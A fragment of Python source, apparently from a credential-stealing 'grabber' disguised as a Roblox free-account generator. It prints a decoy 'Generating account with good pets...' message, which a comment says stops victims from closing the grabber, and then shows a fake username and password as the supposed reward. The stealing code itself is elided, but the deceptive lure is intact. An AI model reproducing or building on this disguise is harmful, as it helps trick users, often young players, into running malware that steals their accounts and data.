...
try:
    ...
    input("You have missing libaries so no roblox accounts for you")




dummy_message = "Generating account with good pets..." # A message that distracts the user from closing the grabber
print(dummy_message)
...
############### Sending fake acc ###########################
cls()
print("Username: amylove_112")
print("Password: Potaxies621")
print()
